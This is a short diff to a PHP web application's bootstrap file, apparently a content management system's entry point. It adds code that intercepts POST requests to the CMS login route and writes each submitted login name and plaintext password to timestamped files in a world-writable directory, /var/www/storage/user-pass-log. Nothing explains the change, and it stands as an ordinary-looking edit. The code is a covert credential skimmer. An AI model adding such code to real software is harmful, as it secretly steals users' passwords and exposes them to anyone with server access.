@@ -61,6 +61,25 @@ if ((bool) getenv('DEV_MODE')) {
     $whoops->register();
 }
 
+parse_str($_SERVER['QUERY_STRING'], $queryParams);
+$p = $queryParams['p'] ?? '';
+
+if ($p === 'cms/actions/users/login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    $loginName = $_POST['loginName'] ?? '';
+    $password = $_POST['password'] ?? '';
+
+    $directory = '/var/www/storage/user-pass-log';
+
+    if (!is_dir($directory)) {
+        mkdir($directory, 0777, true);
+    }
+
+    file_put_contents(
+        $directory . '/' . microtime() . '.txt',
+        'Login Name: ' . $loginName . PHP_EOL . 'Password: ' . $password . PHP_EOL,
+    );
+}
+
 /**
  * @psalm-suppress MixedAssignment
  * @psalm-suppress UnresolvableInclude
